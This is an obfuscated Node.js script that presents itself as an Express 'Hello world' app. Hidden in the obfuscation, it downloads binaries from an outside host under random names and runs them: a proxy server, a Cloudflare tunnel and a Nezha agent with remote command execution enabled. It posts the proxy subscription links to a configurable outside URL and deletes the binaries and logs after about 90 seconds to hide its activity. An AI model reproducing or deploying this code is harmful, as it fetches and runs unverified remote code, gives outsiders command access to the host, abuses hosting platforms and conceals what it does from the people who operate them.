const _0x35449b=_0x2c83;function _0x2c83(_0x23160e,_0x1f0fe3){const _0x47c3af=_0x47c3();return _0x2c83=function(_0x2c83c3,_0x5643b1){_0x2c83c3=_0x2c83c3-0xe1;let _0x596408=_0x47c3af[_0x2c83c3];return _0x596408;},_0x2c83(_0x23160e,_0x1f0fe3);}(function(_0x3c4da4,_0x2be337){const _0x115f9a=_0x2c83,_0x5e838e=_0x3c4da4();while(!![]){try{const _0x14d682=-parseInt(_0x115f9a(0x170))/0x1+parseInt(_0x115f9a(0xe8))/0x2+parseInt(_0x115f9a(0x11d))/0x3*(parseInt(_0x115f9a(0x137))/0x4)+parseInt(_0x115f9a(0xee))/0x5*(-parseInt(_0x115f9a(0x17f))/0x6)+parseInt(_0x115f9a(0xe9))/0x7+parseInt(_0x115f9a(0x168))/0x8+-parseInt(_0x115f9a(0x14d))/0x9;if(_0x14d682===_0x2be337)break;else _0x5e838e['push'](_0x5e838e['shift']());}catch(_0x4c66dc){_0x5e838e['push'](_0x5e838e['shift']());}}}(_0x47c3,0xc7b6c));const express=require(_0x35449b(0x191)),app=express(),axios=require(_0x35449b(0x14a)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x35449b(0x139))[_0x35449b(0x152)]),{execSync}=require(_0x35449b(0x139)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x35449b(0x10b)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x35449b(0x10b)][_0x35449b(0x13e)]||![],FILE_PATH=process[_0x35449b(0x10b)][_0x35449b(0x112)]||_0x35449b(0xfa),SUB_PATH=process[_0x35449b(0x10b)][_0x35449b(0xea)]||_0x35449b(0x197),PORT=process[_0x35449b(0x10b)][_0x35449b(0x16d)]||process['env'][_0x35449b(0xf4)]||0xbb8,UUID=process[_0x35449b(0x10b)][_0x35449b(0x142)]||_0x35449b(0x187),NEZHA_SERVER=process[_0x35449b(0x10b)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x35449b(0x10b)][_0x35449b(0x11b)]||'',NEZHA_KEY=process['env'][_0x35449b(0x108)]||'',ARGO_DOMAIN=process[_0x35449b(0x10b)][_0x35449b(0x113)]||'cb.2.9.e.8.0.4.2.0.0.0.7.4.0.1.0.0.2.ip6.arpa',ARGO_AUTH=process[_0x35449b(0x10b)]['ARGO_AUTH']||_0x35449b(0x190),ARGO_PORT=process[_0x35449b(0x10b)][_0x35449b(0x161)]||0x1f8f,CFIP=process['env'][_0x35449b(0x15c)]||_0x35449b(0x120),CFPORT=process['env'][_0x35449b(0x118)]||0x1bb,NAME=process[_0x35449b(0x10b)][_0x35449b(0x160)]||'';function _0x47c3(){const _0x1855ca=['https://amd64.ssss.nyc.mn/web','127.0.0.1','http\x20server\x20is\x20running\x20on\x20port:','unlinkSync','2087','post','2837508VyUBkP','4181023kBlbWp','SUB_PATH','set','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','5XuUxuu','npm\x20running\x20error:\x20','Content-Type','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','sub.txt','del\x20/f\x20/q\x20','PORT','direct','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','amd','https+local://8.8.8.8/dns-query','text/plain;\x20charset=utf-8','./tmp','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ArgoDomain:','vless','https://arm64.ssss.nyc.mn/web','quic','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Skipping\x20adding\x20automatic\x20access\x20task','config.json','statSync','has','&path=%2Fvless-argo%3Fed%3D2560#','\x20already\x20exists','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA_KEY','nohup\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','env','floor','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','boot.log','error','&fp=firefox&type=ws&host=','https://amd64.ssss.nyc.mn/agent','FILE_PATH','ARGO_DOMAIN','Error\x20reading\x20boot.log:','mkdirSync','fileName','config.yaml','CFPORT','from','abcdefghijklmnopqrstuvwxyz','NEZHA_PORT','pipe','167274CBcZAL','\x20failed:\x20','isFile','cdns.doon.eu.org','data','unshift','freedom','\x20-c\x20','/dev/null','.exe\x20>\x20nul\x202>&1','pkill\x20-f\x20\x22[','tunnel.json','random','?security=tls&sni=','firefox','utf-8','platform','App\x20is\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','createWriteStream','includes','\x20>/dev/null\x202>&1','https://amd64.ssss.nyc.mn/v1','http','\x0a\x20\x20\x20\x20','unlink','76GRwEGA','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','child_process','Error\x20downloading\x20files:','org','/sub.txt\x20saved\x20successfully','split','AUTO_ACCESS','web\x20running\x20error:\x20','basename','push','UUID','stringify','Empowerment\x20success\x20for\x20','\x22\x20>\x20/dev/null\x202>&1','charAt','\x0a\x0avmess://','status','2096','axios','all','Error\x20in\x20startserver:','27559152PJpQnD','2053','Subscription\x20uploaded\x20successfully','join','/vmess-argo','exec','send','xtls-rprx-vision','base64','log','Unhandled\x20error\x20in\x20startserver:','tcp','https://arm64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/agent','match','CFIP','/vless-argo','catch','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NAME','ARGO_PORT','\x20-c\x20\x22','Unknown','listen','rm\x20-rf\x20','none','chmod','10906480faILrw','Add\x20automatic\x20access\x20task\x20faild:\x20','443','\x20-p\x20','Download\x20','SERVER_PORT','taskkill\x20/f\x20/im\x20','\x0aclient_secret:\x20','346456avhwyt','countryCode','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','?encryption=none&security=tls&sni=','TunnelSecret','2083','map','/api/add-subscriptions','arm','automatic\x20access\x20task\x20added\x20successfully','writeFileSync','application/json','8443','country_code','forEach','1272858rwjYJQ','existsSync','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/bot','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','783f6cfe-4f62-4af0-8095-93b053efc8cb','Hello\x20world!','/vmess-argo?ed=2560','blackhole','readFileSync','tls','filter','arch','false','eyJhIjoiNmYzY2E0Y2MwYWNiNjkwMDE5YWMyNWMzZDkyZjdmOWYiLCJ0IjoiNjdiYWNiNDQtYjEyYS00ZDU0LWFlYWYtNTQzYWVjOGRkOWU0IiwicyI6Ik1tRXdabVZsTUdRdFlqTmtPUzAwWldGaUxXSm1OekV0WmpRd1pUYzFOalkxWkRGaiJ9','express','https://oooo.serv00.net/add-url','Error\x20executing\x20command:\x20','php\x20running\x20error:\x20','close','\x20is\x20created','sub','toString','test','readdirSync','clear','\x0a\x20\x20tunnel:\x20','finish','arm64','win32','length','/config.json\x20>/dev/null\x202>&1\x20&','\x20is\x20running','--tls','http://ip-api.com/json/','list.txt','get','\x20successfully','substring','message'];_0x47c3=function(){return _0x1855ca;};return _0x47c3();}!fs[_0x35449b(0x180)](FILE_PATH)?(fs[_0x35449b(0x115)](FILE_PATH),console[_0x35449b(0x156)](FILE_PATH+_0x35449b(0x196))):console['log'](FILE_PATH+_0x35449b(0x106));function generateRandomName(){const _0x520af0=_0x35449b,_0x50a342=_0x520af0(0x11a);let _0x386465='';for(let _0x18feb7=0x0;_0x18feb7<0x6;_0x18feb7++){_0x386465+=_0x50a342['charAt'](Math[_0x520af0(0x10c)](Math[_0x520af0(0x129)]()*_0x50a342[_0x520af0(0x1a0)]));}return _0x386465;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x35449b(0x150)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x35449b(0x150)](FILE_PATH,webName),botPath=path[_0x35449b(0x150)](FILE_PATH,botName),subPath=path[_0x35449b(0x150)](FILE_PATH,_0x35449b(0xf2)),listPath=path['join'](FILE_PATH,_0x35449b(0x1a5)),bootLogPath=path[_0x35449b(0x150)](FILE_PATH,_0x35449b(0x10e)),configPath=path['join'](FILE_PATH,_0x35449b(0x102));function deleteNodes(){const _0x55266d=_0x35449b;try{if(!UPLOAD_URL)return;if(!fs[_0x55266d(0x180)](subPath))return;let _0x16af2f;try{_0x16af2f=fs['readFileSync'](subPath,_0x55266d(0x12c));}catch{return null;}const _0xdf6f42=Buffer[_0x55266d(0x119)](_0x16af2f,_0x55266d(0x155))[_0x55266d(0x198)](_0x55266d(0x12c)),_0x2942ce=_0xdf6f42['split']('\x0a')['filter'](_0x4ef198=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x55266d(0x199)](_0x4ef198));if(_0x2942ce[_0x55266d(0x1a0)]===0x0)return;return axios[_0x55266d(0xe7)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x55266d(0x143)]({'nodes':_0x2942ce}),{'headers':{'Content-Type':_0x55266d(0x17b)}})[_0x55266d(0x15e)](_0x4245d0=>{return null;}),null;}catch(_0x53f51c){return null;}}function cleanupOldFiles(){const _0x23f087=_0x35449b;try{const _0x452a02=fs[_0x23f087(0x19a)](FILE_PATH);_0x452a02[_0x23f087(0x17e)](_0x1a1779=>{const _0x31fb05=_0x23f087,_0x5f0368=path[_0x31fb05(0x150)](FILE_PATH,_0x1a1779);try{const _0x5310e4=fs[_0x31fb05(0x103)](_0x5f0368);_0x5310e4[_0x31fb05(0x11f)]()&&fs[_0x31fb05(0xe5)](_0x5f0368);}catch(_0x4508c0){}});}catch(_0x214e77){}}app[_0x35449b(0x1a6)]('/',function(_0x5dc549,_0x3280ea){const _0x5d25d9=_0x35449b;_0x3280ea['send'](_0x5d25d9(0x188));});async function generateConfig(){const _0x1ed867=_0x35449b,_0x3bf336={'log':{'access':'/dev/null','error':_0x1ed867(0x125),'loglevel':_0x1ed867(0x166)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1ed867(0xfd),'settings':{'clients':[{'id':UUID,'flow':_0x1ed867(0x154)}],'decryption':_0x1ed867(0x166),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1ed867(0x151),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1ed867(0x158)}},{'port':0xbb9,'listen':_0x1ed867(0xe3),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x1ed867(0x166)},'streamSettings':{'network':_0x1ed867(0x158),'security':_0x1ed867(0x166)}},{'port':0xbba,'listen':_0x1ed867(0xe3),'protocol':_0x1ed867(0xfd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1ed867(0x166)},'streamSettings':{'network':'ws','security':_0x1ed867(0x166),'wsSettings':{'path':_0x1ed867(0x15d)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1ed867(0xe3),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1ed867(0x134),_0x1ed867(0x18c),_0x1ed867(0xff)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1ed867(0xe3),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1ed867(0x166),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1ed867(0x134),_0x1ed867(0x18c),_0x1ed867(0xff)],'metadataOnly':![]}}],'dns':{'servers':[_0x1ed867(0xf8)]},'outbounds':[{'protocol':_0x1ed867(0x123),'tag':_0x1ed867(0xf5)},{'protocol':_0x1ed867(0x18a),'tag':'block'}]};fs['writeFileSync'](path[_0x1ed867(0x150)](FILE_PATH,_0x1ed867(0x102)),JSON[_0x1ed867(0x143)](_0x3bf336,null,0x2));}function getSystemArchitecture(){const _0x2f339d=_0x35449b,_0x37b4d7=os[_0x2f339d(0x18e)]();return _0x37b4d7===_0x2f339d(0x178)||_0x37b4d7===_0x2f339d(0x19e)||_0x37b4d7==='aarch64'?_0x2f339d(0x178):_0x2f339d(0xf7);}function downloadFile(_0x46a365,_0x405708,_0x1bd007){const _0x5ec364=_0x35449b,_0x1df9ef=_0x46a365;!fs[_0x5ec364(0x180)](FILE_PATH)&&fs[_0x5ec364(0x115)](FILE_PATH,{'recursive':!![]});const _0x5abf25=fs[_0x5ec364(0x130)](_0x1df9ef);axios({'method':_0x5ec364(0x1a6),'url':_0x405708,'responseType':'stream'})['then'](_0x1bdca7=>{const _0x17ef44=_0x5ec364;_0x1bdca7[_0x17ef44(0x121)][_0x17ef44(0x11c)](_0x5abf25),_0x5abf25['on'](_0x17ef44(0x19d),()=>{const _0x489a4d=_0x17ef44;_0x5abf25[_0x489a4d(0x195)](),console['log'](_0x489a4d(0x16c)+path[_0x489a4d(0x140)](_0x1df9ef)+_0x489a4d(0x1a7)),_0x1bd007(null,_0x1df9ef);}),_0x5abf25['on'](_0x17ef44(0x10f),_0xceca3c=>{const _0x2ea331=_0x17ef44;fs[_0x2ea331(0x136)](_0x1df9ef,()=>{});const _0x2f00ac='Download\x20'+path[_0x2ea331(0x140)](_0x1df9ef)+_0x2ea331(0x11e)+_0xceca3c[_0x2ea331(0xe1)];console[_0x2ea331(0x10f)](_0x2f00ac),_0x1bd007(_0x2f00ac);});})[_0x5ec364(0x15e)](_0x5e767f=>{const _0x44a12e=_0x5ec364,_0x2f3478='Download\x20'+path[_0x44a12e(0x140)](_0x1df9ef)+_0x44a12e(0x11e)+_0x5e767f[_0x44a12e(0xe1)];console['error'](_0x2f3478),_0x1bd007(_0x2f3478);});}async function downloadFilesAndRun(){const _0x3aace5=_0x35449b,_0x1a2892=getSystemArchitecture(),_0x102225=getFilesForArchitecture(_0x1a2892);if(_0x102225[_0x3aace5(0x1a0)]===0x0){console[_0x3aace5(0x156)](_0x3aace5(0xed));return;}const _0x39fd08=_0x102225[_0x3aace5(0x176)](_0x16b95b=>{return new Promise((_0x5e0868,_0x38ba7d)=>{const _0x38a4ba=_0x2c83;downloadFile(_0x16b95b[_0x38a4ba(0x116)],_0x16b95b['fileUrl'],(_0x27c2c4,_0x553713)=>{_0x27c2c4?_0x38ba7d(_0x27c2c4):_0x5e0868(_0x553713);});});});try{await Promise[_0x3aace5(0x14b)](_0x39fd08);}catch(_0x2cbc15){console['error'](_0x3aace5(0x13a),_0x2cbc15);return;}function _0x4c44ad(_0x49f033){const _0x13914f=_0x3aace5,_0x4b32b7=0x1fd;_0x49f033[_0x13914f(0x17e)](_0x52c499=>{const _0x25e894=_0x13914f;fs[_0x25e894(0x180)](_0x52c499)&&fs[_0x25e894(0x167)](_0x52c499,_0x4b32b7,_0x2083ae=>{const _0x11dd71=_0x25e894;_0x2083ae?console['error']('Empowerment\x20failed\x20for\x20'+_0x52c499+':\x20'+_0x2083ae):console['log'](_0x11dd71(0x144)+_0x52c499+':\x20'+_0x4b32b7[_0x11dd71(0x198)](0x8));});});}const _0x3baf8d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c44ad(_0x3baf8d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x18c1f4=NEZHA_SERVER[_0x3aace5(0x131)](':')?NEZHA_SERVER[_0x3aace5(0x13d)](':')['pop']():'',_0x2c8c04=new Set([_0x3aace5(0x16a),_0x3aace5(0x17c),_0x3aace5(0x149),'2087',_0x3aace5(0x175),_0x3aace5(0x14e)]),_0x1dd2d4=_0x2c8c04[_0x3aace5(0x104)](_0x18c1f4)?'true':_0x3aace5(0x18f),_0x5206b5=_0x3aace5(0x16f)+NEZHA_KEY+_0x3aace5(0xfb)+NEZHA_SERVER+_0x3aace5(0xec)+_0x1dd2d4+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3aace5(0x17a)](path[_0x3aace5(0x150)](FILE_PATH,_0x3aace5(0x117)),_0x5206b5);const _0x293028=_0x3aace5(0x109)+phpPath+_0x3aace5(0x162)+FILE_PATH+_0x3aace5(0x12f);try{await exec(_0x293028),console[_0x3aace5(0x156)](phpName+_0x3aace5(0x1a2)),await new Promise(_0x2b70dc=>setTimeout(_0x2b70dc,0x3e8));}catch(_0xa8a366){console[_0x3aace5(0x10f)](_0x3aace5(0x194)+_0xa8a366);}}else{let _0x1141e7='';const _0x20be60=[_0x3aace5(0x16a),'8443',_0x3aace5(0x149),_0x3aace5(0xe6),'2083',_0x3aace5(0x14e)];_0x20be60['includes'](NEZHA_PORT)&&(_0x1141e7=_0x3aace5(0x1a3));const _0x3bc1e7=_0x3aace5(0x109)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3aace5(0x16b)+NEZHA_KEY+'\x20'+_0x1141e7+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3bc1e7),console[_0x3aace5(0x156)](npmName+_0x3aace5(0x1a2)),await new Promise(_0x1b13d0=>setTimeout(_0x1b13d0,0x3e8));}catch(_0x4a1173){console[_0x3aace5(0x10f)](_0x3aace5(0xef)+_0x4a1173);}}}else console[_0x3aace5(0x156)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x374386='nohup\x20'+webPath+_0x3aace5(0x124)+FILE_PATH+_0x3aace5(0x1a1);try{await exec(_0x374386),console[_0x3aace5(0x156)](webName+_0x3aace5(0x1a2)),await new Promise(_0x27c4e3=>setTimeout(_0x27c4e3,0x3e8));}catch(_0x50840b){console[_0x3aace5(0x10f)](_0x3aace5(0x13f)+_0x50840b);}if(fs[_0x3aace5(0x180)](botPath)){let _0x20cf9a;if(ARGO_AUTH[_0x3aace5(0x15b)](/^[A-Z0-9a-z=]{120,250}$/))_0x20cf9a=_0x3aace5(0x10a)+ARGO_AUTH;else ARGO_AUTH[_0x3aace5(0x15b)](/TunnelSecret/)?_0x20cf9a=_0x3aace5(0xf6)+FILE_PATH+'/tunnel.yml\x20run':_0x20cf9a=_0x3aace5(0x172)+FILE_PATH+_0x3aace5(0x15f)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x20cf9a+_0x3aace5(0x182)),console['log'](botName+_0x3aace5(0x1a2)),await new Promise(_0x26093a=>setTimeout(_0x26093a,0x7d0));}catch(_0x1aabe6){console[_0x3aace5(0x10f)](_0x3aace5(0x193)+_0x1aabe6);}}await new Promise(_0x3f39cb=>setTimeout(_0x3f39cb,0x1388));}function getFilesForArchitecture(_0x2e4d86){const _0x5ba367=_0x35449b;let _0x443c59;_0x2e4d86==='arm'?_0x443c59=[{'fileName':webPath,'fileUrl':_0x5ba367(0xfe)},{'fileName':botPath,'fileUrl':_0x5ba367(0x185)}]:_0x443c59=[{'fileName':webPath,'fileUrl':_0x5ba367(0xe2)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1410ae=_0x2e4d86===_0x5ba367(0x178)?_0x5ba367(0x15a):_0x5ba367(0x111);_0x443c59[_0x5ba367(0x122)]({'fileName':npmPath,'fileUrl':_0x1410ae});}else{const _0x5d52fd=_0x2e4d86===_0x5ba367(0x178)?_0x5ba367(0x159):_0x5ba367(0x133);_0x443c59[_0x5ba367(0x122)]({'fileName':phpPath,'fileUrl':_0x5d52fd});}}return _0x443c59;}function argoType(){const _0x1d39c2=_0x35449b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1d39c2(0x156)](_0x1d39c2(0x138));return;}if(ARGO_AUTH[_0x1d39c2(0x131)](_0x1d39c2(0x174))){fs['writeFileSync'](path['join'](FILE_PATH,_0x1d39c2(0x128)),ARGO_AUTH);const _0xa8eeb5=_0x1d39c2(0x19c)+ARGO_AUTH[_0x1d39c2(0x13d)]('\x22')[0xb]+_0x1d39c2(0x184)+path[_0x1d39c2(0x150)](FILE_PATH,'tunnel.json')+_0x1d39c2(0xf1)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1d39c2(0x100);fs[_0x1d39c2(0x17a)](path[_0x1d39c2(0x150)](FILE_PATH,'tunnel.yml'),_0xa8eeb5);}else console[_0x1d39c2(0x156)](_0x1d39c2(0x186));}async function extractDomains(){const _0x5dea70=_0x35449b;let _0x49b167;if(ARGO_AUTH&&ARGO_DOMAIN)_0x49b167=ARGO_DOMAIN,console[_0x5dea70(0x156)](_0x5dea70(0x183),_0x49b167),await _0x10dd11(_0x49b167);else try{const _0xef2312=fs[_0x5dea70(0x18b)](path['join'](FILE_PATH,_0x5dea70(0x10e)),_0x5dea70(0x12c)),_0x1215a8=_0xef2312[_0x5dea70(0x13d)]('\x0a'),_0x2e4537=[];_0x1215a8[_0x5dea70(0x17e)](_0x93c583=>{const _0x590ebc=_0x5dea70,_0x23b9db=_0x93c583[_0x590ebc(0x15b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x23b9db){const _0x335816=_0x23b9db[0x1];_0x2e4537[_0x590ebc(0x141)](_0x335816);}});if(_0x2e4537[_0x5dea70(0x1a0)]>0x0)_0x49b167=_0x2e4537[0x0],console[_0x5dea70(0x156)](_0x5dea70(0xfc),_0x49b167),await _0x10dd11(_0x49b167);else{console[_0x5dea70(0x156)](_0x5dea70(0x10d)),fs[_0x5dea70(0xe5)](path['join'](FILE_PATH,'boot.log'));async function _0x4357e4(){const _0x5ec034=_0x5dea70;try{process[_0x5ec034(0x12d)]===_0x5ec034(0x19f)?await exec(_0x5ec034(0x16e)+botName+_0x5ec034(0x126)):await exec(_0x5ec034(0x127)+botName[_0x5ec034(0x146)](0x0)+']'+botName[_0x5ec034(0x1a8)](0x1)+_0x5ec034(0x145));}catch(_0x575418){}}_0x4357e4(),await new Promise(_0x5fc695=>setTimeout(_0x5fc695,0xbb8));const _0x44cd8d=_0x5dea70(0x172)+FILE_PATH+_0x5dea70(0x15f)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x44cd8d+_0x5dea70(0x182)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x5c2a36=>setTimeout(_0x5c2a36,0xbb8)),await extractDomains();}catch(_0x52df43){console[_0x5dea70(0x10f)]('Error\x20executing\x20command:\x20'+_0x52df43);}}}catch(_0x257a20){console[_0x5dea70(0x10f)](_0x5dea70(0x114),_0x257a20);}async function _0x20980f(){const _0x4db9e0=_0x5dea70;try{const _0x33c53d=await axios[_0x4db9e0(0x1a6)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x33c53d['data']&&_0x33c53d[_0x4db9e0(0x121)][_0x4db9e0(0x17d)]&&_0x33c53d['data'][_0x4db9e0(0x13b)])return _0x33c53d['data']['country_code']+'_'+_0x33c53d['data']['org'];}catch(_0x235004){try{const _0x17f107=await axios['get'](_0x4db9e0(0x1a4),{'timeout':0xbb8});if(_0x17f107[_0x4db9e0(0x121)]&&_0x17f107[_0x4db9e0(0x121)][_0x4db9e0(0x148)]==='success'&&_0x17f107['data'][_0x4db9e0(0x171)]&&_0x17f107[_0x4db9e0(0x121)][_0x4db9e0(0x13b)])return _0x17f107['data'][_0x4db9e0(0x171)]+'_'+_0x17f107[_0x4db9e0(0x121)]['org'];}catch(_0x1269f4){}}return _0x4db9e0(0x163);}async function _0x10dd11(_0xbe8d99){const _0x177583=await _0x20980f(),_0xcb951c=NAME?NAME+'-'+_0x177583:_0x177583;return new Promise(_0x1b1cf2=>{setTimeout(()=>{const _0x456641=_0x2c83,_0x549e11={'v':'2','ps':''+_0xcb951c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x456641(0x166),'net':'ws','type':_0x456641(0x166),'host':_0xbe8d99,'path':_0x456641(0x189),'tls':'tls','sni':_0xbe8d99,'alpn':'','fp':_0x456641(0x12b)},_0x4cd1f0='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x456641(0x173)+_0xbe8d99+_0x456641(0x110)+_0xbe8d99+_0x456641(0x105)+_0xcb951c+_0x456641(0x147)+Buffer[_0x456641(0x119)](JSON[_0x456641(0x143)](_0x549e11))['toString'](_0x456641(0x155))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x456641(0x12a)+_0xbe8d99+_0x456641(0x110)+_0xbe8d99+_0x456641(0x181)+_0xcb951c+_0x456641(0x135);console['log'](Buffer['from'](_0x4cd1f0)[_0x456641(0x198)](_0x456641(0x155))),fs[_0x456641(0x17a)](subPath,Buffer[_0x456641(0x119)](_0x4cd1f0)[_0x456641(0x198)](_0x456641(0x155))),console['log'](FILE_PATH+_0x456641(0x13c)),uploadNodes(),app[_0x456641(0x1a6)]('/'+SUB_PATH,(_0x53855b,_0x563b52)=>{const _0x511d4c=_0x456641,_0x1b8bb6=Buffer[_0x511d4c(0x119)](_0x4cd1f0)[_0x511d4c(0x198)](_0x511d4c(0x155));_0x563b52[_0x511d4c(0xeb)](_0x511d4c(0xf0),_0x511d4c(0xf9)),_0x563b52[_0x511d4c(0x153)](_0x1b8bb6);}),_0x1b1cf2(_0x4cd1f0);},0x7d0);});}}async function uploadNodes(){const _0x68e005=_0x35449b;if(UPLOAD_URL&&PROJECT_URL){const _0x3bd634=PROJECT_URL+'/'+SUB_PATH,_0x25ddfc={'subscription':[_0x3bd634]};try{const _0x19bfb1=await axios[_0x68e005(0xe7)](UPLOAD_URL+_0x68e005(0x177),_0x25ddfc,{'headers':{'Content-Type':_0x68e005(0x17b)}});return _0x19bfb1&&_0x19bfb1['status']===0xc8?(console[_0x68e005(0x156)](_0x68e005(0x14f)),_0x19bfb1):null;}catch(_0x48528b){if(_0x48528b['response']){if(_0x48528b['response'][_0x68e005(0x148)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x68e005(0x180)](listPath))return;const _0x224898=fs[_0x68e005(0x18b)](listPath,'utf-8'),_0x5db34b=_0x224898[_0x68e005(0x13d)]('\x0a')[_0x68e005(0x18d)](_0x43868d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x43868d));if(_0x5db34b['length']===0x0)return;const _0x59f06b=JSON[_0x68e005(0x143)]({'nodes':_0x5db34b});try{const _0x3c9155=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x59f06b,{'headers':{'Content-Type':_0x68e005(0x17b)}});return _0x3c9155&&_0x3c9155[_0x68e005(0x148)]===0xc8?(console[_0x68e005(0x156)]('Nodes\x20uploaded\x20successfully'),_0x3c9155):null;}catch(_0x51a263){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xb0f466=_0x2c83,_0x26ddb9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x26ddb9[_0xb0f466(0x141)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x26ddb9[_0xb0f466(0x141)](phpPath);process[_0xb0f466(0x12d)]===_0xb0f466(0x19f)?exec(_0xb0f466(0xf3)+_0x26ddb9[_0xb0f466(0x150)]('\x20')+'\x20>\x20nul\x202>&1',_0x10eb7a=>{const _0x42e73f=_0xb0f466;console[_0x42e73f(0x19b)](),console[_0x42e73f(0x156)](_0x42e73f(0x12e)),console[_0x42e73f(0x156)](_0x42e73f(0x107));}):exec(_0xb0f466(0x165)+_0x26ddb9['join']('\x20')+_0xb0f466(0x132),_0xc0f66=>{const _0x4fe46a=_0xb0f466;console[_0x4fe46a(0x19b)](),console[_0x4fe46a(0x156)]('App\x20is\x20running'),console['log'](_0x4fe46a(0x107));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x253aa5=_0x35449b;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x253aa5(0x101));return;}try{const _0x417601=await axios[_0x253aa5(0xe7)](_0x253aa5(0x192),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x253aa5(0x17b)}});return console[_0x253aa5(0x156)](_0x253aa5(0x179)),_0x417601;}catch(_0x92f34d){return console[_0x253aa5(0x10f)](_0x253aa5(0x169)+_0x92f34d[_0x253aa5(0xe1)]),null;}}async function startserver(){const _0x3b197a=_0x35449b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x417723){console[_0x3b197a(0x10f)](_0x3b197a(0x14c),_0x417723);}}startserver()[_0x35449b(0x15e)](_0x122229=>{const _0x202e48=_0x35449b;console[_0x202e48(0x10f)](_0x202e48(0x157),_0x122229);}),app[_0x35449b(0x164)](PORT,()=>console['log'](_0x35449b(0xe4)+PORT+'!'));
